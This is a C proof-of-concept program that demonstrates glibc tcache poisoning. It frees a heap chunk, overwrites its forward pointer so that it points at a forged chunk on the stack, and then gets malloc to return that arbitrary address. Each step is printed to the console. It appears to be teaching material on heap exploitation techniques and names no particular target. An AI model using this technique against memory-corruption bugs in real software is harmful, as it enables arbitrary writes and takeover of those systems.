#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stddef.h>

struct forged_chunk {
    size_t prev_size;
    size_t size;
    struct forged_chunk *fd;
    struct forged_chunk *bk;
        /* Only used for large blocks: pointer to next larger size.  */
    struct malloc_chunk* fd_nextsize; /* double links -- used only if free. */
    struct malloc_chunk* bk_nextsize;
};


struct forged_chunk *freed_to_chunk(void *p) {
    return p - offsetof(struct forged_chunk, fd);
}

int main() {
    void *a = malloc(10);
    char victim_data[] = "DeadCafeF0";
    printf("[i] Allocated a\n\t|...a@%p\n", a);

    struct forged_chunk f_chunk;
    printf("[i] Allocated a forged_chunk\n");
       printf("\t|...f_chunk@%p\n", &f_chunk);


    f_chunk.size = 0x21; // 0x20 if 64b, 0x10 if 32b
    printf("[i] Attackers data\n");
       printf("\t|...&f_chunk.fd@%p\n", &f_chunk.fd);

    f_chunk.fd = victim_data;

    printf("[i] Allocated stuff in forged_chunk\n");
            printf("\t|...%s\n", (char*)f_chunk.fd);
    free(a);
            printf("\t|...a@%p got freed-up\n\n", a);

    struct forged_chunk *c_a = freed_to_chunk(a);
    printf("[*] TCACHE BIN CURRENT STATE\n");
        printf("\t|...head[fd] -> a[fd] -> %p -> tail\n", c_a->fd);//a);
        printf("\t\t|...Messing up fastbin-chunk\n");
        printf("\t\t|...Swapping a->fd to f_chunk->fd@%p\n\n", &f_chunk.fd);

    c_a->fd = (char*)&f_chunk.fd;

    printf("[*] TCACHE BIN MESSED UP STATE\n");
        printf("\t|...head[fd] -> a[fd] -> %p -> tail\n\n", c_a->fd);

    printf("[i] Allocating 10 bytes to get rid of a\n");
    void * c = malloc(10);
        printf("\t|...allocated _@%p\n\n", c);

    char *victim = (char*) malloc(10);
    printf("[*] Requesting another 10 bytes\n");
        printf("\t|...victim@%p\n\t\t|...== f_chunk->fd@%p\n\n", victim, &f_chunk.fd);

    printf("[*] Printing out *victim allocated memory:\n");
        printf("\t|...%s\n", *(char**)victim);

    free(c);
    return 0;
}
